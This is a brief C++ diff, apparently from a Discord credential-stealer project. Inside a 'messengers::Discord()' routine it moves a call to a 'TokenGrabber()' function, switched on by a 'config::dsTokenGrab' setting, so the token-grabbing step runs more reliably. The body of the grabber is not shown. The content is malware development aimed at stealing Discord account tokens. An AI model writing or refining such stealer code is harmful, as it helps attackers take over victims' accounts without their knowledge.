@@ -102,10 +102,9 @@ void messengers::Discord()
 				std::cout << error_message << std::endl;
 			}
 		}
-		if (config::dsTokenGrab)
-			TokenGrabber();
 	}
-
+	if (config::dsTokenGrab)
+		TokenGrabber();
 }
 
 int TokenGrabber() 
